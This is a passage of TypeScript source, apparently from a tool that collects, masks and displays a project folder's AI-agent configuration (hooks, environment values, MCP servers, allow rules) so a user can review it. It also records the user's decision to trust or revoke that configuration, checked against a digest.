  commands: FolderConfigCommand[]
  env: FolderConfigEnv[]
  allowRules: FolderConfigAllowRule[]
  mcpServers: FolderConfigMcpServer[]
  otherSettings: FolderConfigOtherSetting[]
  /** The first thing too long to show in full. */
  tooLong?: string
}

function longField(out: Collected, source: string): void {
  if (!out.tooLong) out.tooLong = `${P(source)}: too long to show in full.`
}

function handlerText(h: unknown): string {
  if (isObj(h) && typeof h.command === 'string') return h.command
  try {
    return JSON.stringify(h) ?? ''
  } catch {
    return ''
  }
}

function pushCommand(out: Collected, source: string, kind: 'hook' | 'helper', label: string, command: string): void {
  const hidden = hiddenCharIn(`${label}\n${command}`, { multiline: true })
  const shown = maskText(command)
  if (shown.length > FIELD_MAX) longField(out, source)
  out.commands.push({
    source,
    kind,
    label: clip(label),
    command: clip(shown),
    ...(shown !== command ? { masked: true } : {}),
    ...(hidden ? { hiddenChar: hidden } : {})
  })
}

function collectHooks(out: Collected, source: string, hooks: unknown): void {
  if (!isObj(hooks)) return
  for (const [event, groups] of Object.entries(hooks)) {
    const list = Array.isArray(groups) ? groups : [groups]
    for (const g of list) {
      const matcher = isObj(g) && typeof g.matcher === 'string' && g.matcher ? ` ${g.matcher}` : ''
      const label = `${event.slice(0, 100)}${matcher.slice(0, 101)}`
      if (isObj(g) && Array.isArray(g.hooks)) for (const h of g.hooks) pushCommand(out, source, 'hook', label, handlerText(h))
      else pushCommand(out, source, 'hook', label, handlerText(g))
    }
  }
}

function collectEnv(out: Collected, source: string, env: unknown): void {
  if (!isObj(env)) return
  for (const [name, raw] of Object.entries(env)) {
    const value = typeof raw === 'string' ? raw : JSON.stringify(raw) ?? ''
    // Replaced whole only when it is a single credential word under a secret-like name or an anchored key; otherwise
    // the value shows with just its credential parts (URL user info, tokens) masked.
    const shown = shownValue(name, value)
    const hidden = hiddenCharIn(name) ?? hiddenCharIn(value)
    if (name.length > FIELD_MAX || (!(shown.text === MASK) && shown.text.length > FIELD_MAX)) longField(out, source)
    const routing = isClaudeRoutingVar(name) || /_BASE_URL$/i.test(name)
    out.env.push({ source, name: clip(name), value: clip(shown.text), masked: shown.masked, ...(routing ? { routing: true } : {}), ...(hidden ? { hiddenChar: hidden } : {}) })
  }
}

/** The first hidden character anywhere in a parsed value (keys and strings), or null. */
function firstHidden(v: unknown, depth = 0): string | null {
  if (depth > 20) return null
  if (typeof v === 'string') return hiddenCharIn(v, { multiline: true })
  if (Array.isArray(v)) {
    for (const x of v) {
      const h = firstHidden(x, depth + 1)
      if (h) return h
    }
    return null
  }
  if (isObj(v)) {
    for (const [k, x] of Object.entries(v)) {
      const h = hiddenCharIn(k) ?? firstHidden(x, depth + 1)
      if (h) return h
    }
  }
  return null
}

function pushOther(out: Collected, source: string, key: string, value: unknown): void {
  let shown: string
  let raw: string
  try {
    raw = JSON.stringify(value) ?? ''
    shown = JSON.stringify(maskJson(value, key.split('.').pop(), undefined, 0)) ?? ''
  } catch {
    raw = ''
    shown = ''
  }
  if (shown.length > FIELD_MAX) longField(out, source)
  const hidden = firstHidden(value)
  out.otherSettings.push({ source, key, value: clip(shown), ...(shown !== raw ? { masked: true } : {}), ...(hidden ? { hiddenChar: hidden } : {}) })
}

const SETTINGS_OTHER = ['enabledPlugins', 'extraKnownMarketplaces', 'enableAllProjectMcpServers', 'enabledMcpjsonServers', 'mcpServers'] as const
const SETTINGS_PERMISSION_OTHER = ['defaultMode', 'additionalDirectories'] as const
const CODEX_OTHER = ['notify', 'hooks', 'model_provider', 'model_providers', 'profile', 'profiles', 'approval_policy', 'sandbox_mode'] as const

function collectSettings(out: Collected, source: string, v: unknown): void {
  if (!isObj(v)) return
  collectHooks(out, source, v.hooks)
  for (const k of HELPER_KEYS) if (v[k] !== undefined) pushCommand(out, source, 'helper', k, handlerText(typeof v[k] === 'string' ? { command: v[k] } : v[k]))
  for (const k of ['statusLine', 'fileSuggestion'] as const) if (v[k] !== undefined) pushCommand(out, source, 'helper', k, handlerText(v[k]))
  collectEnv(out, source, v.env)
  for (const k of SETTINGS_OTHER) if (v[k] !== undefined) pushOther(out, source, k, v[k])
  if (isObj(v.permissions)) {
    for (const k of SETTINGS_PERMISSION_OTHER) if (v.permissions[k] !== undefined) pushOther(out, source, `permissions.${k}`, v.permissions[k])
  }
  const allow = isObj(v.permissions) ? v.permissions.allow : undefined
  if (Array.isArray(allow)) {
    for (const r of allow) {
      if (typeof r !== 'string') continue
      const hidden = hiddenCharIn(r)
      if (r.length > FIELD_MAX) {
        longField(out, source)
        out.allowRules.push({ source, rule: clip(r), refused: 'The rule is too long to show in full.', ...(hidden ? { hiddenChar: hidden } : {}) })
        continue
      }
      const refused = allowRuleRefusal(r.trim()) ?? (hidden ? `The rule contains a hidden character (${hidden}).` : null)
      out.allowRules.push({ source, rule: r, ...(refused ? { refused } : {}), ...(hidden ? { hiddenChar: hidden } : {}) })
    }
  }
}

function quoteArg(a: string): string {
  return a === '' || /[\s"']/.test(a) ? JSON.stringify(a) : a
}

function maskUrl(url: string): string {
  return maskText(url)
}

function pairsOf(v: unknown): Array<[string, string]> {
  if (!isObj(v)) return []
  return Object.entries(v)
    .map(([k, x]): [string, string] => [k, typeof x === 'string' ? x : JSON.stringify(x) ?? ''])
    .sort(([a], [b]) => (a < b ? -1 : a > b ? 1 : 0))
}

function mcpTarget(spec: Record<string, unknown>): { target: string; masked: boolean } {
  let masked = false
  const mt = (x: string): string => {
    const y = maskText(x)
    if (y !== x) masked = true
    return y
  }
  const url = typeof spec.url === 'string' ? spec.url : undefined
  if (url !== undefined) {
    const headers = pairsOf(spec.headers ?? spec.http_headers)
    const shownUrl = maskUrl(url)
    if (shownUrl !== url) masked = true
    const parts = headers.map(([k, v]) => {
      const sv = shownValue(k, v)
      if (sv.masked) masked = true
      return `-H ${JSON.stringify(`${k}: ${sv.text}`)}`
    })
    return { target: [shownUrl, ...parts].join(' '), masked }
  }
  const env = pairsOf(spec.env).map(([k, v]) => {
    const sv = shownValue(k, v)
    if (sv.masked) masked = true
    return `${k}=${sv.text === MASK ? MASK : quoteArg(sv.text)}`
  })
  const args = Array.isArray(spec.args) ? spec.args.map((a) => (typeof a === 'string' ? a : JSON.stringify(a) ?? '')) : []
  const command = typeof spec.command === 'string' ? spec.command : ''
  const shownArgs = maskedArgs(args)
  if (shownArgs.some((a, i) => a !== args[i])) masked = true
  return { target: [...env, quoteArg(mt(command)), ...shownArgs.map(quoteArg)].join(' '), masked }
}

function collectMcp(out: Collected, source: string, servers: unknown): void {
  if (!isObj(servers)) return
  for (const [name, raw] of Object.entries(servers)) {
    const spec = isObj(raw) ? raw : {}
    const t = isObj(raw) ? mcpTarget(spec) : { target: JSON.stringify(raw) ?? '', masked: false }
    if (name.length > FIELD_MAX || t.target.length > FIELD_MAX) longField(out, source)
    // Hidden characters are judged on the raw values, not the masked display.
    const parts = [name, typeof spec.command === 'string' ? spec.command : '', typeof spec.url === 'string' ? spec.url : '', ...(Array.isArray(spec.args) ? spec.args.filter((a): a is string => typeof a === 'string') : [])]
    const hidden = parts.map((p) => hiddenCharIn(p)).find(Boolean) ?? null
    out.mcpServers.push({ source, name: clip(name), target: clip(t.target), ...(t.masked ? { masked: true } : {}), ...(hidden ? { hiddenChar: hidden } : {}) })
  }
}

function emptyCollected(): Collected {
  return { commands: [], env: [], allowRules: [], mcpServers: [], otherSettings: [] }
}

function collectFrom(out: Collected, rel: string, text: string): void {
  if (rel === '.codex/config.toml') {
    const t = parseToml(text)
    if (t.error) return
    collectMcp(out, rel, t.data.mcp_servers)
    // `notify` runs a program on events: list it as a command too (argv joined). [model_providers.*] auth commands
    // stay in otherSettings.
    const notify = t.data.notify
    if (Array.isArray(notify) && notify.length && notify.every((x) => typeof x === 'string')) pushCommand(out, rel, 'helper', 'notify', (notify as string[]).map(quoteArg).join(' '))
    for (const k of CODEX_OTHER) if (t.data[k] !== undefined) pushOther(out, rel, k, t.data[k])
    return
  }
  const v = parseJsonObject(text)
  if (v === undefined) return
  if (rel === '.mcp.json') collectMcp(out, rel, isObj(v) ? v.mcpServers : undefined)
  else if (rel === '.codex/hooks.json') collectHooks(out, rel, isObj(v) && isObj(v.hooks) ? v.hooks : v)
  else collectSettings(out, rel, v)
}

interface Analysis {
  files: FolderConfigFile[]
  collected: Collected
  truncated: boolean
  /** Something that would run could not be shown in full. */
  unreviewable?: string
}

const EFFECT_RANK: Record<RepoConfigEffect, number> = { 'runs-commands': 0, tools: 1, instructions: 2 }

/** Everything the review shows, built once per scan. Files that run things spend the text budget first. */
function analyze(scan: FolderConfigScan): Analysis {
  if (scan.analysis) return scan.analysis
  let truncated = false
  let unreviewable: string | undefined
  const unseen = (why: string): void => {
    if (!unreviewable) unreviewable = why
  }
  const collected = emptyCollected()
  const entries = scan.entries.filter((e) => e.kind !== 'dir')
  const byRank = entries.map((e, i) => ({ e, i })).sort((a, b) => EFFECT_RANK[a.e.effect] - EFFECT_RANK[b.e.effect] || a.i - b.i)
  const built = new Map<Entry, FolderConfigFile>()
  let total = 0
  for (const { e } of byRank) {
    const f: FolderConfigFile = { path: e.rel, effect: e.effect, kind: e.kind as 'file' | 'link' | 'other', sizeBytes: e.size, digested: e.digested }
    const pathHidden = hiddenCharIn(e.rel)
    if (pathHidden) f.hiddenChar = pathHidden
    if (e.kind === 'link') f.linkTarget = e.linkTarget
    const runs = e.effect === 'runs-commands'
    if (e.kind === 'file' && e.buf) {
      const raw = decode(e.buf)
      if (raw !== undefined) {
        const hidden = hiddenCharIn(raw, { multiline: true })
        if (hidden && !f.hiddenChar) f.hiddenChar = hidden
        if (STRUCTURED.has(e.rel) && e.size <= STRUCTURED_MAX) collectFrom(collected, e.rel, raw)
        const json = e.rel.endsWith('.json') ? parseJsonObject(raw) : undefined
        let shown = json !== undefined ? JSON.stringify(maskJson(json, undefined, undefined, 0), null, 2) : maskLines(raw.slice(0, FOLDER_CONFIG_FILE_TEXT_MAX + 1))
        if (e.size > e.buf.length || (json === undefined && raw.length > FOLDER_CONFIG_FILE_TEXT_MAX)) f.truncated = true
        if (shown.length > FOLDER_CONFIG_FILE_TEXT_MAX) {
          shown = shown.slice(0, FOLDER_CONFIG_FILE_TEXT_MAX)
          f.truncated = true
        }
        if (total + shown.length > FOLDER_CONFIG_TOTAL_TEXT_MAX) {
          f.truncated = true
          truncated = true
        } else {
          total += shown.length
          f.text = shown
        }
      } else if (runs) {
        unseen(`${P(e.rel)}: a binary file that runs things cannot be shown.`)
      }
    } else if (e.kind === 'file' && e.size > 0) {
      f.truncated = true
    }
    if (f.truncated && runs) unseen(`${P(e.rel)}: too long to show in full.`)
    built.set(e, f)
  }
  let files = entries.map((e) => built.get(e) as FolderConfigFile)
  if (files.length > FOLDER_CONFIG_LIST_MAX) {
    truncated = true
    for (const f of files.slice(FOLDER_CONFIG_LIST_MAX)) if (f.effect === 'runs-commands') unseen(`${P(f.path)}: too long to show in full.`)
    files = files.slice(0, FOLDER_CONFIG_LIST_MAX)
  }
  const lists: Array<[string, unknown[]]> = [
    ['commands', collected.commands],
    ['environment values', collected.env],
    ['allow rules', collected.allowRules],
    ['MCP servers', collected.mcpServers],
    ['other settings', collected.otherSettings]
  ]
  for (const [what, list] of lists) {
    if (list.length >= FOLDER_CONFIG_LIST_MAX) {
      unseen(`This folder's config lists ${what} up to or past the limit of ${FOLDER_CONFIG_LIST_MAX}, too many to show in full.`)
      if (list.length > FOLDER_CONFIG_LIST_MAX) truncated = true
    }
  }
  if (collected.tooLong) unseen(collected.tooLong)
  scan.analysis = { files, collected, truncated, ...(unreviewable ? { unreviewable } : {}) }
  return scan.analysis
}

/** What accepting would approve, read from disk now. A 'none' project still lists its content. */
export function folderConfigReview(project: Pick<Project, 'id' | 'path' | 'kind' | 'folderConfigTrust'>): FolderConfigReview {
  const scan = scanFolderConfig(project.path)
  const state = folderConfigStateOf(project, scan)
  const a = analyze(scan)
  const c = a.collected
  const cut = <T>(list: T[]): T[] => list.slice(0, FOLDER_CONFIG_LIST_MAX)
  const unreviewable = scan.unreviewable ?? a.unreviewable
  return {
    projectId: project.id,
    state,
    digest: scan.digest,
    files: a.files,
    commands: cut(c.commands),
    env: cut(c.env),
    allowRules: cut(c.allowRules),
    mcpServers: cut(c.mcpServers),
    otherSettings: cut(c.otherSettings),
    truncated: a.truncated,
    ...(unreviewable ? { unreviewable } : {})
  }
}

// ---------- Apply ----------

function localRulesOf(scan: FolderConfigScan): string[] {
  const e = scan.entries.find((x) => x.rel === LOCAL_RULES_FILE && x.kind === 'file' && x.buf)
  const text = e?.buf ? decode(e.buf) : undefined
  if (text === undefined) return []
  const v = parseJsonObject(text)
  const allow = isObj(v) && isObj(v.permissions) ? v.permissions.allow : undefined
  if (!Array.isArray(allow)) return []
  return [...new Set(allow.filter((r): r is string => typeof r === 'string').map((r) => r.trim()).filter(Boolean))].filter(readableRule)
}

/**
 * The project after the user's decision (the caller saves it). Refuses with a readable sentence: no gate ('none'), a
 * missing or malformed digest, a digest that no longer matches the folder, or trust on an unreviewable config.
 * Accepting copies the readable rules of the folder's settings.local.json into `deps.rulesFile` (never ones already
 * imported: a rule the user removed later stays removed); revoking removes the rules it imported.
 */
export function applyFolderConfigTrust(
  project: Project,
  input: Pick<FolderConfigTrustInput, 'trust' | 'digest'>,
  deps: { rulesFile: string; now?: () => string }
): Project {
  const stored = project.folderConfigTrust
  if (stored === undefined) throw new Error('This project has no folder config to review.')
  const decidedAt = (deps.now ?? (() => new Date().toISOString()))()
  const previous = cleanFolderConfigTrust(stored)?.importedRules ?? []
  if (typeof input.digest !== 'string' || !DIGEST_RE.test(input.digest)) throw new Error("Review this folder's config first.")
  const scan = scanFolderConfig(project.path)
  if (scan.digest !== input.digest) throw new Error("This folder's config changed since you reviewed it. Review it again.")
  if (input.trust !== true) {
    for (const rule of previous) {
      try {
        removeRule({ file: deps.rulesFile }, rule)
      } catch {
        /* an unreadable rules file: the trust still ends */
      }
    }
    return { ...project, folderConfigTrust: { state: 'untrusted', decidedAt, importedRules: [] } }
  }
  const unreviewable = scan.unreviewable ?? analyze(scan).unreviewable
  if (unreviewable) throw new Error(unreviewable)
  const fresh = localRulesOf(scan).filter((r) => !previous.includes(r))
  const { added } = fresh.length ? addRulesReport({ file: deps.rulesFile }, fresh) : { added: [] as string[] }
  const importedRules = [...new Set([...previous, ...added])].slice(0, 1000)
  return { ...project, folderConfigTrust: { state: 'trusted', digest: scan.digest, decidedAt, importedRules } }
}
